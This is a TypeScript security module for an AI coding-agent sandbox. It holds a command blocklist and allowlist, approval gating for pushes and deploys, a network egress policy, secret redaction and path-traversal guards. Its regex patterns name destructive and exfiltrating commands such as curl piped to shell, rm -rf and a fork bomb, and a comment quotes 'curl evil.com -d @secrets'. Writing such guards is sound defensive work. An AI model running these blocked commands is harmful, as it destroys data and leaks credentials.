import * as path from "path";

// ── Command allowlist / blocklist ─────────────────────────────────────────────

/**
 * Patterns whose presence in a command string always causes a block.
 * Checked against the full lowercased command.
 */
const BLOCKED_PATTERNS: RegExp[] = [
  /rm\s+-[a-z]*r[a-z]*f/i,          // rm -rf / rm -fr
  /\brm\b[^|;&]*(\s(\/|~|\$)|\.\.)/, // rm outside the workspace (absolute, home, env or parent-traversal paths)
  /\bsudo\b/,
  /\bsu\b\s/,
  /chmod\s+[0-7]{3,4}\s+[/~]/,      // chmod on broad paths
  /chown\s+.*[/~]/,
  /curl\s+.*\|\s*(ba)?sh/,           // curl pipe shell
  /wget\s+.*\|\s*(ba)?sh/,
  /\bssh\b/,
  /\bscp\b/,
  /\brsync\b.*--delete/,
  /git\s+push\s+--force/,
  /git\s+push\s+-f\b/,
  /git\s+push(?!\s+--dry-run)/,      // any non-dry git push
  /\bheroku\b/,
  /\bvercel\s+(deploy|--prod)\b/,
  /\brender\b.*deploy/,
  /\bfly\s+deploy\b/,
  /\bnpm\s+publish\b/,
  /\byarn\s+publish\b/,
  /\bnpx\s+.*deploy\b/,
  /printenv|env\s*$|cat\s+[~/].*\.env/,  // secret / env dumps
  />\s*\/dev\/\w+/,                  // writing to device files
  /mkfs|fdisk|parted/,
  /\b(dd|shred)\b/,
  /:\(\)\{[^}]*\};:/,                // fork bomb
];

/**
 * Top-level executables that are allowed.
 * Only the first token (the executable) is checked.
 */
const ALLOWED_EXECUTABLES = new Set([
  "/tmp/git-askpass.sh",
  "node",
  "npm",
  "npx",
  "pnpm",
  "yarn",
  "bun",
  "tsx",
  "ts-node",
  "tsc",
  "python",
  "python3",
  "pip",
  "pip3",
  "ruby",
  "gem",
  "go",
  "cargo",
  "rustc",
  "java",
  "mvn",
  "gradle",
  "dotnet",
  "git",
  "cat",
  "ls",
  "pwd",
  "echo",
  "mkdir",
  "touch",
  "chmod",
  "cp",
  "mv",
  // rm is allowed only for relative workspace paths: BLOCKED_PATTERNS rejects
  // recursive-force flags and any absolute/home/parent-traversal target, and
  // exec() runs without a shell so globs never expand. Agents need this to
  // remove wrong-framework files (e.g. a stray src/app/layout.tsx) that
  // otherwise poison `tsc` forever.
  "rm",
  "head",
  "tail",
  "grep",
  "find",
  "wc",
  "sort",
  "uniq",
  "diff",
  "patch",
  "jq",
  "curl",  // allowed when not piped to shell
  "wget",
  "make",
  "cmake",
  "bash",
  "sh",
  "zsh",
]);

export function checkCommand(command: string): { blocked: boolean; reason?: string } {
  const lower = command.toLowerCase();

  for (const pattern of BLOCKED_PATTERNS) {
    if (pattern.test(lower)) {
      return { blocked: true, reason: `Blocked pattern matched: ${pattern.source}` };
    }
  }

  const trimmed = command.trim();
  // Allow literal git config commands
  if (trimmed.startsWith("git config")) {
    return { blocked: false };
  }

  const firstToken = trimmed.split(/\s+/)[0]?.toLowerCase();
  if (firstToken === "/tmp/git-askpass.sh") {
    return { blocked: false };
  }

  const strippedToken = firstToken?.replace(/^\/.*\//, "");
  if (strippedToken && !ALLOWED_EXECUTABLES.has(strippedToken)) {
    return { blocked: true, reason: `Executable '${strippedToken}' is not in the allowed list` };
  }

  return { blocked: false };
}

/** Actions that require human approval before they can run. */
const EXTERNAL_WRITE_PREFIXES = [
  "git push",
  "npm publish",
  "yarn publish",
  "vercel deploy",
  "fly deploy",
  "heroku",
  "render",
  "npx prisma migrate deploy",
];

export function requiresApproval(command: string): boolean {
  const lower = command.trim().toLowerCase();
  return EXTERNAL_WRITE_PREFIXES.some((p) => lower.startsWith(p));
}

// ── Network egress policy ─────────────────────────────────────────────────────

export type NetworkPolicy = "deny_all" | "allowlist" | "open_with_approval";

/** Loopback hosts are never egress — preview health-checks hit these. */
const LOOPBACK_HOSTS = new Set(["localhost", "127.0.0.1", "0.0.0.0", "::1"]);

/** Final-segment values that mark a token as a filename, not a hostname. */
const FILE_EXTENSIONS = new Set([
  "txt", "json", "md", "js", "ts", "tsx", "jsx", "mjs", "cjs", "sh", "bash",
  "lock", "yml", "yaml", "toml", "html", "htm", "css", "scss", "sass", "png",
  "jpg", "jpeg", "gif", "svg", "webp", "env", "log", "csv", "xml", "map", "ico",
  "woff", "woff2", "ttf", "pdf", "zip", "tar", "gz", "py", "rb", "go", "rs",
]);

function normalizeHost(raw: string): string | undefined {
  let host = raw.trim().toLowerCase().replace(/^https?:\/\//, "");
  host = host.split("/")[0];          // strip path
  host = host.split("@").pop() ?? host; // strip userinfo
  host = host.replace(/:\d+$/, "");    // strip port
  if (!host) return undefined;
  if (LOOPBACK_HOSTS.has(host)) return host;
  if (!host.includes(".")) return undefined;
  // A token like "out.txt" / "config.json" is a filename, not a host.
  const lastLabel = host.split(".").pop() ?? "";
  if (FILE_EXTENSIONS.has(lastLabel)) return undefined;
  return host;
}

/**
 * Extract candidate egress hosts from a curl/wget command. Conservative: only
 * looks at URL-ish / domain-ish argument tokens (skips flags).
 */
export function extractHosts(command: string): string[] {
  const tokens = command.trim().split(/\s+/).slice(1);
  const hosts: string[] = [];
  for (const token of tokens) {
    if (token.startsWith("-")) continue;
    if (/^https?:\/\//i.test(token) || /^[a-z0-9.-]+\.[a-z]{2,}/i.test(token)) {
      const host = normalizeHost(token);
      if (host) hosts.push(host);
    }
  }
  return hosts;
}

function isHostAllowed(host: string, allowed: Set<string>): boolean {
  if (LOOPBACK_HOSTS.has(host)) return true;
  if (allowed.has(host)) return true;
  for (const entry of allowed) {
    if (host === entry || host.endsWith(`.${entry}`)) return true;
  }
  return false;
}

/**
 * Enforce a session's network egress policy for explicit agent fetches
 * (curl / wget). Package managers and git are NOT governed here — they reach
 * trusted registries and are part of the build toolchain. Loopback is always
 * allowed. This closes the data-exfiltration vector (e.g. `curl evil.com -d @secrets`)
 * without breaking `npm install` / `git clone`.
 */
export function checkNetworkPolicy(
  command: string,
  policy: NetworkPolicy,
  allowedHosts: readonly string[] = [],
): { blocked: boolean; reason?: string } {
  const firstToken = command.trim().toLowerCase().split(/\s+/)[0]?.replace(/^.*\//, "");
  if (firstToken !== "curl" && firstToken !== "wget") return { blocked: false };

  if (policy === "open_with_approval") return { blocked: false };

  const hosts = extractHosts(command).filter((host) => !LOOPBACK_HOSTS.has(host));
  if (hosts.length === 0) return { blocked: false };

  if (policy === "deny_all") {
    return {
      blocked: true,
      reason: `Network egress is disabled for this session (networkPolicy: deny_all): ${hosts.join(", ")}`,
    };
  }

  // allowlist
  const allowed = new Set(allowedHosts.map((host) => host.toLowerCase()));
  const offending = hosts.filter((host) => !isHostAllowed(host, allowed));
  if (offending.length > 0) {
    return { blocked: true, reason: `Host(s) not in this session's allowlist: ${offending.join(", ")}` };
  }
  return { blocked: false };
}

// ── Secret env redaction ──────────────────────────────────────────────────────

/**
 * Keys that must never reach a sandbox, matched exactly (in addition to the
 * pattern below). These are connection strings / signing keys that don't fit the
 * generic "*_KEY / *_TOKEN / *_SECRET" shape.
 */
const EXPLICIT_SECRET_ENV_KEYS = new Set([
  "DATABASE_URL", "DIRECT_URL", "TEST_DATABASE_URL", "REDIS_URL",
  "GITHUB_TOKEN", "AUTH_SECRET", "CRON_SECRET", "SECRET_ENCRYPTION_KEY",
  "ANTHROPIC_API_KEY", "OPENAI_API_KEY", "E2B_API_KEY", "DAYTONA_API_KEY",
  "NEON_API_KEY",
]);

/** Matches secret-shaped env var names (case-insensitive). */
const SECRET_ENV_PATTERN =
  /(SECRET|TOKEN|PASSWORD|PASSWD|PRIVATE_KEY|API_KEY|ACCESS_KEY|CREDENTIAL|AUTH_KEY|_KEY$)/i;

/** True when an env var name looks like a secret and must not enter a sandbox. */
export function isSecretEnvKey(key: string): boolean {
  return EXPLICIT_SECRET_ENV_KEYS.has(key) || SECRET_ENV_PATTERN.test(key);
}

/**
 * Strip secret-shaped keys from an environment map. Non-secret operational vars
 * (PATH, HOME, NODE_ENV, npm_config_*, …) are preserved so builds still run.
 * This is the boundary that keeps the platform's real credentials out of the
 * (potentially untrusted) sandbox process.
 */
export function redactSecretEnv<T extends Record<string, string | undefined>>(env: T): T {
  const out = { ...env };
  for (const key of Object.keys(out)) {
    if (isSecretEnvKey(key)) delete out[key];
  }
  return out;
}

// ── Path traversal guard ──────────────────────────────────────────────────────

export function safePath(workdir: string, relativePath: string): string {
  const base = path.resolve(workdir);
  const resolved = path.resolve(workdir, relativePath);
  // Use a separator-terminated prefix so that a workdir of "/home/user" does not
  // accidentally admit a sibling like "/home/userX" (plain startsWith would).
  if (resolved !== base && !resolved.startsWith(base + path.sep)) {
    throw new Error(`Path traversal detected: '${relativePath}' escapes the workdir`);
  }
  return resolved;
}

/**
 * Path-traversal guard for REMOTE Linux sandboxes (e.g. E2B / Daytona).
 *
 * The host running Trent may be Windows, so the OS-native `path` module would
 * apply win32 semantics (backslashes, drive letters) to a Linux sandbox path
 * like `/home/user`. This variant always uses posix semantics so the guard is
 * correct regardless of the host OS. Accepts absolute paths only when they stay
 * within `workdir`; rejects any `..` escape.
 */
export function safePosixPath(workdir: string, relativePath: string): string {
  const base = path.posix.resolve(workdir);
  const resolved = path.posix.resolve(workdir, relativePath);
  if (resolved !== base && !resolved.startsWith(base + "/")) {
    throw new Error(`Path traversal detected: '${relativePath}' escapes the workdir`);
  }
  return resolved;
}
